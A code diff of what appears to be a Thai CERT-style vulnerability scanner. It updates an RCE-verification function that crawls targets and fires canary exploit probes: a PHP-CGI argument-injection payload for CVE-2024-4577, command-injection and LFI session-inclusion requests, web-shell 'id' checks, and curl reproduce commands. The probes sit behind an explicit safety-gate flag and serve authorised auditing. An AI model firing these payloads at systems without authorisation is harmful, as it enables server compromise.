@@ -21,6 +21,8 @@ from datetime import datetime
 from typing import Dict, Any, Optional
 import httpx
 
+from audit.crawler import crawl_target, hash_body
+
 
 def generate_audit_trail(
     operator: str,
@@ -76,14 +78,18 @@ async def probe_active_rce_proof(
     port: int,
     server: str = "",
     is_php: bool = True,
+    is_windows: Optional[bool] = None,
     allow_active_rce: bool = False,
-    operator: str = "security-auditor"
+    operator: str = "security-auditor",
+    reported_base_url: Optional[str] = None
 ) -> dict:
     """
     Actively probes target endpoint for genuine Remote Code Execution (RCE)
     with strict Safety Gate, tri-state verdict, and cryptographic audit trail.
+    Ensures internal Docker bridge IPs are never leaked in customer-facing reproduce commands.
     """
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    display_base = (reported_base_url or base_url).rstrip("/")
 
     # -------------------------------------------------------------
     # SAFETY GATE CHECK
@@ -114,15 +120,37 @@ async def probe_active_rce_proof(
     }
 
     # -------------------------------------------------------------
-    # DYNAMIC PATH & OS RECONNAISSANCE (Linux & Windows Discovery)
+    # DYNAMIC WEB RECONNAISSANCE & PARAMETER HARVESTING (Crawler + Baseline)
     # -------------------------------------------------------------
-    is_windows = any(k in server.lower() for k in ["iis", "windows", "win32", "win64", "xampp", "microsoft"])
+    if is_windows is None:
+        is_windows = any(k in server.lower() for k in ["iis", "windows", "win32", "win64", "xampp", "microsoft"])
     discovered_params = set()
     discovered_endpoints = set()
     discovered_drives = set(["C:", "D:"])
     discovered_roots = set()
+    baseline_hash = ""
+    baseline_status = 404
 
-    # Pre-flight inspection: harvest links, forms, error paths, and OS signatures
+    # 1. Shallow recursive crawler with rate limiting & differential baseline
+    try:
+        crawl_res = await crawl_target(
+            client=client,
+            base_url=base_url,
+            max_depth=2,
+            max_pages=15,
+            time_budget=4.0,
+            rate_limit=15.0
+        )
+        baseline_hash = crawl_res.baseline_hash
+        baseline_status = crawl_res.baseline_status
+        for ep_path, ep_info in crawl_res.endpoints.items():
+            discovered_endpoints.add(ep_path)
+            for p in ep_info.get("params", []):
+                discovered_params.add(p)
+    except Exception:
+        pass
+
+    # 2. Pre-flight root inspection: harvest error paths, FPD, and OS signatures
     try:
         r_pre = await client.get(f"{base_url}/", headers=headers, timeout=2.0)
         pre_text = r_pre.text or ""
@@ -131,13 +159,13 @@ async def probe_active_rce_proof(
         if any(k in combined_srv for k in ["iis", "windows", "win32", "win64", "xampp", "aspnet", "microsoft"]):
             is_windows = True
 
-        # 1. Harvest query parameters from links and body
+        # Harvest query parameters from links and body
         for m_p in re.finditer(r'[?&]([a-zA-Z0-9_\-]+)=', pre_text):
             p_name = m_p.group(1).lower()
             if len(p_name) <= 20:
                 discovered_params.add(p_name)
 
-        # 2. Harvest forms, links, and all endpoint mentions anywhere in HTML
+        # Harvest forms, links, and all endpoint mentions anywhere in HTML
         for m_ep in re.finditer(r'(/[a-zA-Z0-9_/\-]+\.(?:php|aspx|cgi|jsp|ashx|pl)[^\s<>"\'()]*)', pre_text, re.I):
             ep_str = m_ep.group(1).strip()
             discovered_endpoints.add(ep_str)
@@ -147,8 +175,8 @@ async def probe_active_rce_proof(
                     if "=" in q_seg:
                         discovered_params.add(q_seg.split("=")[0].lower())
 
-        # 3. Dynamic Full Path Disclosure (FPD) Harvest
-        fpd_matches = re.findall(r'([A-Za-z]:[\\/][^<>"\'\r\n\s]+)', pre_text)
+        # Dynamic Full Path Disclosure (FPD) Harvest (ensure not preceded by scheme like http://)
+        fpd_matches = re.findall(r'(?<![a-zA-Z0-9])([A-Za-z]:[\\/][^<>"\'\r\n\s]+)', pre_text)
         for fpd in fpd_matches:
             is_windows = True
             m_drv = re.match(r'^([A-Za-z]:)', fpd)
@@ -183,13 +211,14 @@ async def probe_active_rce_proof(
 
     for ep_path, p_name in cmd_candidates:
         test_cmd_url = f"{base_url}{ep_path if ep_path != '/' else ''}?{p_name}=echo+{cmd_canary_expected}"
+        test_cmd_url_display = f"{display_base}{ep_path if ep_path != '/' else ''}?{p_name}=echo+{cmd_canary_expected}"
         try:
             r_cmd = await client.get(test_cmd_url, headers=headers, timeout=2.0)
             if cmd_canary_expected in (r_cmd.text or ""):
                 trail = generate_audit_trail(
                     operator=operator,
                     method="GET",
-                    url=test_cmd_url,
+                    url=test_cmd_url_display,
                     req_headers=headers,
                     payload_str=f"echo {cmd_canary_expected}",
                     status_code=r_cmd.status_code,
@@ -204,8 +233,8 @@ async def probe_active_rce_proof(
                     "command_executed": f"echo {cmd_canary_expected}",
                     "execution_output": f"{cmd_canary_expected} (OS Shell Command Output Confirmed)",
                     "privilege_level": "Windows Command Shell (cmd.exe)" if is_windows else "OS Shell Process",
-                    "exploit_endpoint": test_cmd_url,
-                    "reproduce_curl": f"curl -s '{test_cmd_url}'",
+                    "exploit_endpoint": test_cmd_url_display,
+                    "reproduce_curl": f"curl -s '{test_cmd_url_display}'",
                     "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบจุดรับคำสั่งส่งเข้า OS Shell โดยตรง สามารถสั่งรันคำสั่งควบคุมระบบปฏิบัติการได้จริง",
                     "verified_at": ts,
                     "operator": operator,
@@ -230,12 +259,13 @@ async def probe_active_rce_proof(
             "file": ("audit_canary.txt", b"Canary session stream probe", "application/octet-stream")
         }
         
-        upload_targets = ["/", "/upload_progress.php", "/index.php"]
+        upload_targets = ["/", "/login.php", "/upload_progress.php", "/index.php", "/api/app.php", "/cart.php"]
         for ep in discovered_endpoints:
-            if "upload" in ep.lower() and ep not in upload_targets:
-                upload_targets.append(ep.split("?")[0])
+            clean_ep = ep.split("?")[0]
+            if any(k in clean_ep.lower() for k in ["upload", "login", "account", "auth", "session"]) and clean_ep not in upload_targets:
+                upload_targets.append(clean_ep)
 
-        for u_path in upload_targets[:4]:
+        for u_path in upload_targets[:5]:
             try:
                 await client.post(f"{base_url}{u_path}", files=multipart_data, headers=headers, timeout=2.0)
             except Exception:
@@ -276,9 +306,14 @@ async def probe_active_rce_proof(
         for param in lfi_params:
             for s_path in session_paths:
                 test_trigger_url = f"{base_url}/?{param}={s_path}"
+                test_trigger_url_display = f"{display_base}/?{param}={s_path}"
                 try:
                     r_trig = await client.get(test_trigger_url, headers=headers, timeout=2.0)
                     resp_content = r_trig.text or ""
+
+                    # Differential Baseline Check: ignore response if identical to 404 baseline
+                    if baseline_hash and hash_body(resp_content) == baseline_hash:
+                        continue
                     
                     # Step 5: Tri-state Evaluation
                     # 1) RCE_CONFIRMED: The arithmetic expression was executed by PHP Engine
@@ -286,7 +321,7 @@ async def probe_active_rce_proof(
                         trail = generate_audit_trail(
                             operator=operator,
                             method="GET",
-                            url=test_trigger_url,
+                            url=test_trigger_url_display,
                             req_headers=headers,
                             payload_str=canary_payload,
                             status_code=r_trig.status_code,
@@ -301,8 +336,8 @@ async def probe_active_rce_proof(
                             "command_executed": f"PHP Eval Canary: {seed_a}+{seed_b} = {seed_a + seed_b}",
                             "execution_output": f"{canary_expected} (Arbitrary PHP Code Execution Confirmed)",
                             "privilege_level": "Windows Web Process (IIS/XAMPP)" if is_windows else "Web Server Process / PHP Worker",
-                            "exploit_endpoint": test_trigger_url,
-                            "reproduce_curl": f"curl -s -b 'PHPSESSID={session_id}' '{test_trigger_url}'",
+                            "exploit_endpoint": test_trigger_url_display,
+                            "reproduce_curl": f"curl -s -b 'PHPSESSID={session_id}' '{test_trigger_url_display}'",
                             "impact_statement": "ยืนยันผลการประเมิน: พบช่องโหว่ LFI และเซิร์ฟเวอร์ประมวลผลโค้ด PHP ที่ฝังใน Session Upload Progress สำเร็จ",
                             "verified_at": ts,
                             "operator": operator,
@@ -314,7 +349,7 @@ async def probe_active_rce_proof(
                         trail = generate_audit_trail(
                             operator=operator,
                             method="GET",
-                            url=test_trigger_url,
+                            url=test_trigger_url_display,
                             req_headers=headers,
                             payload_str=canary_payload,
                             status_code=r_trig.status_code,
@@ -329,8 +364,8 @@ async def probe_active_rce_proof(
                             "command_executed": "Session Inode Inclusion Check",
                             "execution_output": "Canary token reflected verbatim without evaluation (PHP Execution Tag Neutralized)",
                             "privilege_level": "Local File Read (Pre-RCE Blocked)",
-                            "exploit_endpoint": test_trigger_url,
-                            "reproduce_curl": f"curl -s -b 'PHPSESSID={session_id}' '{test_trigger_url}'",
+                            "exploit_endpoint": test_trigger_url_display,
+                            "reproduce_curl": f"curl -s -b 'PHPSESSID={session_id}' '{test_trigger_url_display}'",
                             "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบ LFI และสามารถอ่านไฟล์เซสชันที่ฝัง Canary ได้ แต่ PHP Engine ไม่ได้ประมวลผลโค้ด (ยังไม่บรรลุ RCE)",
                             "verified_at": ts,
                             "operator": operator,
@@ -340,14 +375,15 @@ async def probe_active_rce_proof(
                     pass
 
     # -------------------------------------------------------------
-    # FLOW 2: PHP-CGI Argument Injection (CVE-2024-4577) Canary Probe
+    # FLOW 2: PHP-CGI Argument Injection (CVE-2024-4577) Canary Probe (Windows Only)
     # -------------------------------------------------------------
-    if is_php:
+    if is_php and is_windows:
         seed_c = random.randint(10000, 89999)
         seed_d = random.randint(1000, 9999)
         cgi_canary_expected = f"THAICERT_CGI_RCE_{seed_c + seed_d}"
         cgi_payload = f"<?php echo 'THAICERT_CGI_RCE_'.({seed_c}+{seed_d}); exit; ?>"
         test_cgi_url = f"{base_url}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
+        test_cgi_url_display = f"{display_base}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
         
         try:
             r = await client.post(test_cgi_url, content=cgi_payload, headers=headers, timeout=2.0)
@@ -355,7 +391,7 @@ async def probe_active_rce_proof(
                 trail = generate_audit_trail(
                     operator=operator,
                     method="POST",
-                    url=test_cgi_url,
+                    url=test_cgi_url_display,
                     req_headers=headers,
                     payload_str=cgi_payload,
                     status_code=r.status_code,
@@ -370,8 +406,8 @@ async def probe_active_rce_proof(
                     "command_executed": f"php://input canary execution: {seed_c}+{seed_d} = {seed_c + seed_d}",
                     "execution_output": f"{cgi_canary_expected} (Arbitrary Code Execution Confirmed)",
                     "privilege_level": "Web Server Process / CGI Worker",
-                    "exploit_endpoint": test_cgi_url,
-                    "reproduce_curl": f"curl -s -X POST '{test_cgi_url}' -d '{cgi_payload}'",
+                    "exploit_endpoint": test_cgi_url_display,
+                    "reproduce_curl": f"curl -s -X POST '{test_cgi_url_display}' -d '{cgi_payload}'",
                     "impact_statement": "ยืนยันผลการประเมิน: ช่องโหว่ Argument Injection ทำให้ส่ง directives แทรกผ่าน Best-fit mapping และสั่งรันโค้ด PHP ภายนอกได้จริง",
                     "verified_at": ts,
                     "operator": operator,
@@ -396,12 +432,15 @@ async def probe_active_rce_proof(
     for lfi_url, cmd, tech, sig in lfi_candidates:
         try:
             r = await client.get(lfi_url, headers=headers, timeout=2.0)
+            if baseline_hash and hash_body(r.text or "") == baseline_hash:
+                continue
             if sig.lower() in (r.text or "").lower():
                 out = r.text[:200].strip()
+                lfi_url_display = lfi_url.replace(base_url, display_base)
                 trail = generate_audit_trail(
                     operator=operator,
                     method="GET",
-                    url=lfi_url,
+                    url=lfi_url_display,
                     req_headers=headers,
                     payload_str=cmd,
                     status_code=r.status_code,
@@ -416,8 +455,8 @@ async def probe_active_rce_proof(
                     "command_executed": cmd,
                     "execution_output": out,
                     "privilege_level": "Local File Read (Arbitrary File Access - Pre-RCE)",
-                    "exploit_endpoint": lfi_url,
-                    "reproduce_curl": f"curl -s '{lfi_url}'",
+                    "exploit_endpoint": lfi_url_display,
+                    "reproduce_curl": f"curl -s '{lfi_url_display}'",
                     "impact_statement": f"ยืนยันผลการประเมิน: ตรวจพบช่องโหว่ Arbitrary File Read ผ่านพารามิเตอร์เรียกไฟล์ สามารถเข้าถึงไฟล์ระบบ ({cmd}) ได้จริง (ยังไม่ยืนยัน RCE)",
                     "verified_at": ts,
                     "operator": operator,
@@ -441,11 +480,12 @@ async def probe_active_rce_proof(
                 m = re.search(r'(uid=[0-9]+\([^)]+\)\s+gid=[0-9]+\([^)]+\)[^\r\n"]*)', r.text)
                 if m:
                     out = m.group(1).strip()
+                    target_url_display = target_url.replace(base_url, display_base)
                     priv = "Root / Superuser (UID 0)" if "uid=0" in out else "Standard Web Service User"
                     trail = generate_audit_trail(
                         operator=operator,
                         method="GET",
-                        url=target_url,
+                        url=target_url_display,
                         req_headers=headers,
                         payload_str="cmd=id",
                         status_code=r.status_code,
@@ -460,8 +500,8 @@ async def probe_active_rce_proof(
                         "command_executed": "id",
                         "execution_output": out,
                         "privilege_level": priv,
-                        "exploit_endpoint": target_url,
-                        "reproduce_curl": f"curl -s '{target_url}'",
+                        "exploit_endpoint": target_url_display,
+                        "reproduce_curl": f"curl -s '{target_url_display}'",
                         "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบ Web Shell ที่ถูกฝังและสามารถตอบสนองคำสั่งระบบได้จริง",
                         "verified_at": ts,
                         "operator": operator,
